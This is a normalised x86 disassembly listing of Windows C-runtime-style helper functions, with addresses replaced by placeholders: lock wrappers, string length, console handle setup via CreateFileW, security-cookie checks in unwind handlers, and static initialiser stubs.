call [ DecodePointer@IAT ]
retn
sub_415a2a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_415bc1
test ebx ebx
je r-xdata
retn
push 0x0
call sub_415801
pop ecx
sub_415c37
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_415f97
pop ecx
mov [ rw-data ] 0x1
sub_415f8e
push 0xd
call sub_415801
pop ecx
retn
sub_41610f
push 0xd
call sub_415801
pop ecx
retn
sub_4163cb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_416718
push 0x1
call sub_415801
pop ecx
retn
sub_416ff9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_416f30
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_417044
call eax
retn
sub_4173d9
push 0xc
call sub_415801
pop ecx
retn
sub_417463
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41742d
pop ecx
pop ecx
pop ebp
retn
sub_417567
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417474
add esp 0x10
pop ebp
retn
sub_417885
push 0xa
call sub_415801
pop ecx
retn
sub_417962
push 0xa
call sub_415801
pop ecx
retn
sub_417a2a
push 0xb
call sub_415801
pop ecx
retn
sub_417e1e
push edi
call sub_417ba2
pop ecx
retn
sub_417ebd
push 0xc
call sub_415801
pop ecx
retn
sub_41802e
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417f1b
add esp 0x18
pop ebp
retn
sub_41804c
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418064
add esp 0x10
pop ebp
retn
sub_418179
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418191
add esp 0x10
pop ebp
retn
sub_41834d
push 0x2
call sub_411048
sub_418e40
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_413fc0
sub_418e56
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_413fc0
sub_418e6c
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_418e83
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_41aa65
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_414571
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41aa80
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_414571
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41aa9b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_414571
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
j_sub_414594
jmp sub_414594
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_41b03c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_41b045
mov esp [ ebp - 0x18 ]
call sub_4159b8
sub_41b067
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_414571
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41b082
mov [ ecx ] r--data
jmp sub_414594
sub_41b147
push [ ebp - 0x14 ]
call sub_41b33b
pop ecx
retn
sub_41b280
push 0x4
mov eax sub_41bdb0
call sub_41ab74
call sub_414adf
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4159ec
call sub_415980
sub_41b969
xor eax eax
inc eax
retn
sub_41b96d
mov esp [ ebp - 0x18 ]
call sub_4159b8
sub_41bae7
xor eax eax
inc eax
retn
sub_41baeb
mov esp [ ebp - 0x18 ]
call sub_4159b8
sub_41bbca
push [ ebp - 0x14 ]
call sub_41bafb
pop ecx
retn
sub_41bc08
call sub_414adf
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_414adf
dec [ eax + 0x90 ]
sub_41bd5e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_41bdb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41bdd0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call sub_40a950
add esp 0x8
retn
sub_41bde1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41be00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41be30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41be60
lea ecx [ ebp + 0x8 ]
jmp sub_40b130
sub_41be68
lea ecx [ ebp - 0x234 ]
jmp sub_40b130
sub_41be73
lea ecx [ ebp - 0x219 ]
jmp sub_40d580
sub_41be7e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x264 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41beb0
lea ecx [ ebp - 0x28 ]
jmp sub_40b130
sub_41beb8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41bee0
lea ecx [ ebp - 0x234 ]
jmp sub_40b130
sub_41beeb
lea ecx [ ebp - 0x280 ]
jmp sub_40b130
sub_41bef6
lea ecx [ ebp - 0x268 ]
jmp sub_40b130
sub_41bf01
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x278 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41bf30
lea ecx [ ebp - 0x12d8 ]
jmp sub_40b0a0
sub_41bf3b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12d0 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41bf70
lea ecx [ ebp - 0x25c ]
jmp sub_40b130
sub_41bf7b
lea ecx [ ebp - 0x234 ]
jmp sub_40b130
sub_41bf86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x254 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41bfb0
lea ecx [ ebp - 0xac ]
jmp sub_40b130
sub_41bfbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41bff0
lea ecx [ ebp - 0x2a0 ]
jmp sub_40b0a0
sub_41bffb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x298 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41c030
lea ecx [ ebp - 0x28 ]
jmp sub_40b0a0
sub_41c038
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_40f682
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40f682
mov eax r--data
jmp sub_41af57
sub_41c060
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c070
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c080
push ebp
mov ebp esp
mov ecx rw-data
call sub_40ada0
push sub_41c2a0
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c0a0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40ae80
push sub_41c290
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c0c0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40af60
push sub_41c280
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c0e0
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_40ab80
pop ebp
retn
sub_41c100
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_40ab80
pop ebp
retn
sub_41c120
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_40ab80
pop ebp
retn
sub_41c140
push ebp
mov ebp esp
push 0x0
mov ecx rw-data
call sub_40ab80
pop ebp
retn
sub_41c160
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c170
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c180
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c190
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c1a0
push ebp
mov ebp esp
push r--data
mov ecx rw-data
call sub_40b0f0
push sub_41c2b0
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c1d0
push ebp
mov ebp esp
push r--data
mov ecx rw-data
call sub_40b0f0
push sub_41c2c0
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c200
push ebp
mov ebp esp
push r--data
mov ecx rw-data
call sub_40b0f0
push sub_41c2d0
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c230
push ebp
mov ebp esp
push r--data
mov ecx rw-data
call sub_40b0f0
push r-xdata
call sub_40ff91
add esp 0x4
pop ebp
retn
sub_41c260
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c270
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x1 ] al
mov esp ebp
pop ebp
retn
sub_41c280
push ebp
mov ebp esp
mov ecx rw-data
call sub_40af40
pop ebp
retn
sub_41c290
push ebp
mov ebp esp
mov ecx rw-data
call sub_40af40
pop ebp
retn
sub_41c2a0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40ae60
pop ebp
retn
sub_41c2b0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40b130
pop ebp
retn
sub_41c2c0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40b130
pop ebp
retn
sub_41c2d0
push ebp
mov ebp esp
mov ecx rw-data
call sub_40b130
pop ebp
retn
